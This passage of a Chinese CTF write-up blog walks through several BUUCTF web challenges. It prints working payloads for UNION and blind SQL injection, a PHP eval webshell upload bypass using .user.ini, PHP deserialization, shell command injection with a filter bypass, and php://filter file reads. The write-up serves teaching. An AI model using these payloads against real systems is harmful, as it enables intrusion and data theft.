<p>这里原理就是利用nodeprep.prepare函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次nodeprep.prepare函数会把<code>A</code>转换成<code>a</code>。<br> 所以当我们用<code>ᴬdmin</code>注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成<code>Admin</code>，我们用<code>ᴬdmin</code>进行登录，可以看到index页面的username变成了<code>Admin</code>，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可（改一下密码重新登录）。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617180807334.png" alt="image-20200617180807334"></p>
<p>我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为<code>admin</code>，从而改掉<code>admin</code>的密码。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617180838843.png" alt="image-20200617180838843"></p>
<p>然后用<code>admin</code>和改的密码的登录，即可获取flag。</p>
<p>使用的是<code>admin</code>而不是<code>ᴬdmin</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617194252428.png" alt="image-20200617194252428"></p>
<p>还有两种解法，转自：<a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener">https://www.jianshu.com/p/f92311564ad0</a></p>
<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154326790.png" alt="image-20200619154326790"></p>
<p>题目已经提醒了是SQL注入，所以在用户名处进行注入，看看能否进行报错，说明存在SQL注入而且也是单引号出错的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154426285.png" alt="image-20200619154426285"></p>
<p>将后面加入注释符试试</p>
<p>发现返回了md5值，经过尝试发现无法解密，说明错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154519487.png" alt="image-20200619154519487"></p>
<p>直接在输入框没办法进行，在URL中试试，打开火狐使用hackbar当然也可以不用，只不过这样看的更直观而已</p>
<p>这样发现显示了不是之前的password而是显示了input。。。，这里可以猜测#不能使用，使用%23试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154853693.png" alt="image-20200619154853693"></p>
<p>使用%23之后发现页面返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155011435.png" alt="image-20200619155011435"></p>
<p>尽心测试注入字段，没有字段4，尝试一下字段3看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155036006.png" alt="image-20200619155036006"></p>
<p>发现字段3页面返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155229344.png" alt="image-20200619155229344"></p>
<p>查看注入点，username需要为错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155320193.png" alt="image-20200619155320193"></p>
<p>查看数据库</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155343358.png" alt="image-20200619155343358"></p>
<p>查看表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;geek&#39;%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155450550.png" alt="image-20200619155450550"></p>
<p>我们查询一下l0ve1ysq1这个表，发现返回了用户名和密码，看看有没有可用的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155629096.png" alt="image-20200619155629096"></p>
<p>将页面往后拉，发现出现了flag，复制提交即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#39; union select 1,2,group_concat(username,password)from l0ve1ysq1%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155856927.png" alt="image-20200619155856927"></p>
<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>查看页面</p>
<p>根据题目的提示可以分析是信息泄露，我们使用dirsearch来扫描一下目录看看有没有什么敏感的目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620181135515.png" alt="image-20200620181135515"></p>
<p>这个我们在kali中安装一下dirsearch</p>
<p>安装很简单，直接在GitHub中下载，然后解压就可以</p>
<p>地址：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p>
<p>解压后进到dirsearch-master这个目录中，右键打开终端使用以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dirsearch.py -u http:&#x2F;&#x2F;27f2f340-235e-47d8-8df9-f2a984334abe.node3.buuoj.cn -e php</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620182053874.png" alt="image-20200620182053874"></p>
<p>dirsearch参数介绍</p>
<p>-u    指定URL</p>
<p>-e    扫描网站语言</p>
<p>-w    可以加上自己的字典（带上路径）</p>
<p>-i    递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）</p>
<p>–random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）</p>
<p>我们这里就指定php来跑</p>
<p>跑完之后发现有一个<a href="http://www.zip的压缩包，有点可疑，在页面中访问一下" target="_blank" rel="noopener">www.zip的压缩包，有点可疑，在页面中访问一下</a></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620182353231.png" alt="image-20200620182353231"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;27f2f340-235e-47d8-8df9-f2a984334abe.node3.buuoj.cn&#x2F;www.zip</span><br></pre></td></tr></table></figure>

<p>访问上面链接之后会下载一个zip的文件，打开之后发现有三个php文件</p>
<p>分别是class.php、flag.php，index.php这三个php 文件，打开看看</p>
<p>index.php</p>
<p>查看index.php文件，这里只是筛选了php，还有一些HTML直接省略</p>
<p>这里可以看到包含了class.php文件和GET传参select的值，然后反序列化该值，接着看class.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在调用__destruct()的时候，username=admin，password=100的时候输出flag，因此我们 需要构造一个序列化，使得username=admin，password=100</p>
<p>可以将下面的代码复制到在线php执行或者复制到phpstudy的www目录下访问都可以，就会输出值</p>
<p>在线php网址：<a href="https://tool.lu/coderunner/" target="_blank" rel="noopener">https://tool.lu/coderunner/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 进行实例化</span><br><span class="line">$a &#x3D; new Name(&#39;admin&#39;, 100);</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620185451166.png" alt="image-20200620185451166"></p>
<p>复制将上面代码复制出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>其中name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()魔法函数。而且因为是private声明，我们需要在<strong>类名和字段名前面都会加上\0的前缀</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620184615544.png" alt="image-20200620184615544"></p>
<p><strong>PHP魔法函数</strong></p>
<p>php类中包含了一些魔法函数，这些函数可以再脚本的任何地方不用声明就可以使用</p>
<p>与php（反）序列化有关的魔法函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_construct()	&#x2F;&#x2F; 当一个对象创建时调用</span><br><span class="line">_destruct()		&#x2F;&#x2F; 当对象被销毁时触发</span><br><span class="line">_wakeup()		&#x2F;&#x2F; 使用unserialize时触发</span><br><span class="line">_sleep()		&#x2F;&#x2F; 使用serialize时触发</span><br><span class="line">_toString()		&#x2F;&#x2F; 把类当做字符串使用的时触发</span><br><span class="line">_get()			&#x2F;&#x2F; 用于从不可访问的属性读取数据</span><br><span class="line">————————————————————————————————————————————————</span><br><span class="line">_set()			&#x2F;&#x2F; 用于将数据写入不可访问的属性</span><br><span class="line">_isset()		&#x2F;&#x2F; 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">_unset()		&#x2F;&#x2F; 在不可访问的属性上使用unset()时触发</span><br><span class="line">_invoke()		&#x2F;&#x2F; 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>打开页面</p>
<p>是一个文件上传漏洞，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620222538324.png" alt="image-20200620222538324"></p>
<p>尝试一下上传一句话木马</p>
<p>返回了illegal suffix!，非法后缀，那么就上传图片码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620223047850.png" alt="image-20200620223047850"></p>
<p>将文件后缀改为图片后缀</p>
<p>返回了&lt;? in contents!，说明不能使用<code>&lt;?</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620223209799.png" alt="image-20200620223209799"></p>
<p>然后将内容伪造成<code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;123&#39;]);&lt;/script&gt;</code></p>
<p>返回了exif_imagetype:not image!，意思这个文件不是图像，这个简单伪造一个文件头就行，在文件头部加入GIF89a来进行伪造</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620224157308.png" alt="image-20200620224157308"></p>
<p>伪造之后进行提交，发现成功提交了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620224350841.png" alt="image-20200620224350841"></p>
<p>经过上面的错误可以得到以下几点内容</p>
<p>1、不能上传带有<code>&lt;?</code>的文件</p>
<p>2、上传文件必须含有图片头</p>
<p>经过以上两点内容，我们可以先上上传一个.user.ini进去，用来解析含有php代码的图片，即可达到绕过限制的目的</p>
<h5 id="介绍-user-ini"><a href="#介绍-user-ini" class="headerlink" title="介绍.user.ini"></a>介绍.user.ini</h5><p>.user.ini上传\隐藏后门</p>
<p>上传条件：</p>
<ul>
<li>服务器脚本语言为PHP</li>
<li>服务器使用CGI/FastCGI模式</li>
<li>上传目录下要有可执行的php文件</li>
</ul>
<p>两种参数介绍</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  &#x2F;&#x2F;绕过exif_imagetype()</span><br><span class="line">auto_prepend_file&#x3D;a.jpg &#x2F;&#x2F;指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</span><br><span class="line">auto_append_file&#x3D;a.jpg  &#x2F;&#x2F;解析后进行包含</span><br></pre></td></tr></table></figure>

<p>优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx/apache/IIS都有效，而<code>.htaccess</code>只适用于apache</p>
<p>这里我们就构造.user.ini文件，内容是<code>auto_prepend_file=图片名称</code></p>
<p>这里我们的图片名称是123.jpg所以就要将.user.ini里的图片名称改为123.jpg</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225047364.png" alt="image-20200620225047364"></p>
<p>然后进行上传，返回了一个index.php文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225146776.png" alt="image-20200620225146776"></p>
<p>上传的地址，在后面加上index.php然后进行访问</p>
<p>url：<code>http://dc82f315-0e45-4911-9f8d-05bb8e8d0d23.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</code></p>
<p>页面返回了这个文件伪造的头部，这样说明成功了，如果出现错误，就例如页面打不开等，检查一下.user.ini和图片码中的代码结尾处是否有空格，图片码没试过，但是.user.ini如果你在内容的后面加空格的话，然后上传，是无法显示内容的，菜刀、蚁剑也连接不上</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225323155.png" alt="image-20200620225323155"></p>
<p>这样复制url在蚁剑中进行连接，打开蚁剑 ，右键空白处，点击添加数据，粘贴URL输入密码，然后测试连接，连接成功后，点击添加。完成后双击添加的数据即可进入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225802515.png" alt="image-20200620225802515"></p>
<p>在左上角目录列表处点击<code>/</code>，查看全部目录，将内容拉倒最底部，会发现一个flag文件，双击打开里面就是flag值，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225851432.png" alt="image-20200620225851432"></p>
<p>打开flag文件后显示以下内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225940707.png" alt="image-20200620225940707"></p>
<h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>打开页面</p>
<p>其实看到题目的时候应该就知道这个一个关于shell连接的题</p>
<p>看到内容已经给你答案了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230237557.png" alt="image-20200620230237557"></p>
<p>直接复制URL到菜刀或者蚁剑，密码页面已经给到了，就是Syc，连接即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230404458.png" alt="image-20200620230404458"></p>
<p>进入目录后还是点击<code>/</code>查看全部目录，然后拉到最后，找到flag文件，双击文件进去，就可以看到flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230449555.png" alt="image-20200620230449555"></p>
<p>复制flag提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230538643.png" alt="image-20200620230538643"></p>
<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>查看页面</p>
<p>看了看发现没有什么关注的点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621121654181.png" alt="image-20200621121654181"></p>
<p>使用burp抓包看看，将包发送到Repeater模块，审计一下源码。发现一个Secret.php，在URL中访问一下看看返回什么</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621122341875.png" alt="image-20200621122341875"></p>
<p>页面返回，<code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;</code>说不是从后面的网址访问的，这个一看就是要伪造Reperer</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123038660.png" alt="image-20200621123038660"></p>
<p>发现返回了，<code>Please use &quot;Syclover&quot; browser</code>，让其限制浏览器，伪造一下User-Agent，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123717787.png" alt="image-20200621123717787"></p>
<p>发现又返回说不是本地访问，在伪造一下X-Forwarded-For</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123849566.png" alt="image-20200621123849566"></p>
<p>伪造之后发现返回flag，左侧红线处是伪造的内容。复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621124040452.png" alt="image-20200621124040452"></p>
<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>查看页面</p>
<p>可以根据题目和网页内容可以看出这可以ping地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621161807677.png" alt="image-20200621161807677"></p>
<p>在URL构造一下试试，发现成功了。可以猜测这是命令执行</p>
<p>使用分号分隔，然后尝试ls命令看看能否列出文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621161914064.png" alt="image-20200621161914064"></p>
<p>发现使用ls后成功将文件列出来了。看到有flag文件，我们使用cat命令来查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621162103524.png" alt="image-20200621162103524"></p>
<p>发现提示非法空格，说明空格不能使用，这样就需要绕过空格</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621162147692.png" alt="image-20200621162147692"></p>
<p>绕过空格有一下几种内容</p>
<ul>
<li>%20、%09、$IFS、${IFS} 、$IFS$1、&lt; 、&lt;&gt; 、{cat,flag.php}</li>
</ul>
<p>这里经过测试发现$IFS$1可以使用，然后查看一下index.php文件</p>
<p>得到以下代码</p>
<p>可以看到过滤了&amp;，/，?，*，&lt;，&gt;，\x{00}-\x{1f}，‘，”，\，(，)，[，]，{，}，空格，bash，flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里可以使用变量拼接绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>

<p>页面返回正常的时候按F12查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621163343886.png" alt="image-20200621163343886"></p>
<p>发现flag就在源码中，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621163431390.png" alt="image-20200621163431390"></p>
<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>打开页面</p>
<p>发现有一个超链接，点击进去看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621233751090.png" alt="image-20200621233751090"></p>
<p>返回了<code>Can you find out the flag?</code>，但是发现URL中有<code>?file=flag.php</code>，第一反应就是用<code>php://input</code>伪协议</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621233900931.png" alt="image-20200621233900931"></p>
<p>使用<code>php://input</code>伪协议页面返回，发现被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234138692.png" alt="image-20200621234138692"></p>
<p>然后考虑一下是不是<code>php://filter</code>伪协议</p>
<p>尝试一下看看页面返回</p>
<p>Payload：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>页面返回了base64，复制解密一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234352974.png" alt="image-20200621234352974"></p>
<p>发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234442026.png" alt="image-20200621234442026"></p>
<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>打开页面</p>
<p>在登录框中输入数字看看返回什么东西</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165408704.png" alt="image-20200622165408704"></p>
<p>这里就先输入1，返回了Hello, glzjin wants a girlfriend.</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165624243.png" alt="image-20200622165624243"></p>
<p>输入2看看，返回了Do you want to be my girlfriend?，当输入3的时候页面返回了错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165641410.png" alt="image-20200622165641410"></p>
<p>这里就可以猜测是sql注入了，而且有两个字段，然后我们按照平常的姿势来注入，发现都不行，使用burpsuite抓包进行爆破，看看过滤了哪些字符，可以看到482长度的都是过滤了的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622171254105.png" alt="image-20200622171254105"></p>
<p>这样我们就可以使用异或来进行注入</p>
<p>这里的两个flag是因为页面上已经写上了</p>
<p>pyload：<code>0^(ascii(substr((select(flag)from(flag))1,1)&gt;1)</code></p>
<p>这样因为是盲注手注也行，但是太慢了，这里我们使用脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;29818d74-a256-4cfa-8521-0a24e85f886c.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line"># flag长度</span><br><span class="line">for x in range(1,50):</span><br><span class="line"># ascii常用字符</span><br><span class="line">    right&#x3D;137</span><br><span class="line">    left&#x3D;30</span><br><span class="line"># 二分法，去头去尾取中间</span><br><span class="line">    mid&#x3D;(right+left)&#x2F;&#x2F;2</span><br><span class="line"></span><br><span class="line">    while right &gt; left:</span><br><span class="line">        payload &#x3D; &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot; % (x, mid)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &quot;id&quot;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        resopnse&#x3D;requests.post(url,data&#x3D;data)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">       # 这里多行注释不能使用单引号，因为if的下面的Hello是单引号，这样就会导致报错</span><br><span class="line">		&quot;&quot;&quot;</span><br><span class="line">        Hello是因为当你输入1的时候返回的值</span><br><span class="line">        值能取逗号前或者逗号后的值，不能乱取。</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if &#39;Hello&#39; in resopnse.text:</span><br><span class="line">        # 每次最左侧都往又位移1次，如果不加1就会一直返回一个值</span><br><span class="line">            